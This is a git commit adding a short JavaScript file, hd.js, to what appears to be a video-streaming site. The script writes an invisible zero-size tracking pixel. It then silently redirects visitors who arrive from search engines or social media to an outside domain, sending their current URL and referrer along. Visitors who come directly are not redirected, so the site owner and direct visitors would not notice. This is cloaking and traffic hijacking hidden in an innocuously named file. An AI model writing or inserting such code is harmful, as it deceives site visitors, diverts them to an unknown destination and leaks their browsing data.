9919a514a2cb3a836530eee5e3adb5bfb7b5ff73
hiroshimada <lajunastudio@gmail.com>
2025-05-20 16:52:19 +0700

    Create hd.js

---
+++ watchnow/hd.js
@@ -0,0 +1,7 @@
+///// stats /////
+document.write('<img alt="stats" src="//sstatic1.histats.com/0.gif?4943112&101"width="0" height="0"/>');
+
+
+///// Arsae /////
+var ars = 'https://ilazy.wolfarmy.net';
+if(['.aol.', 'msn.', '.google.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'coccoc.', 'baidu.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
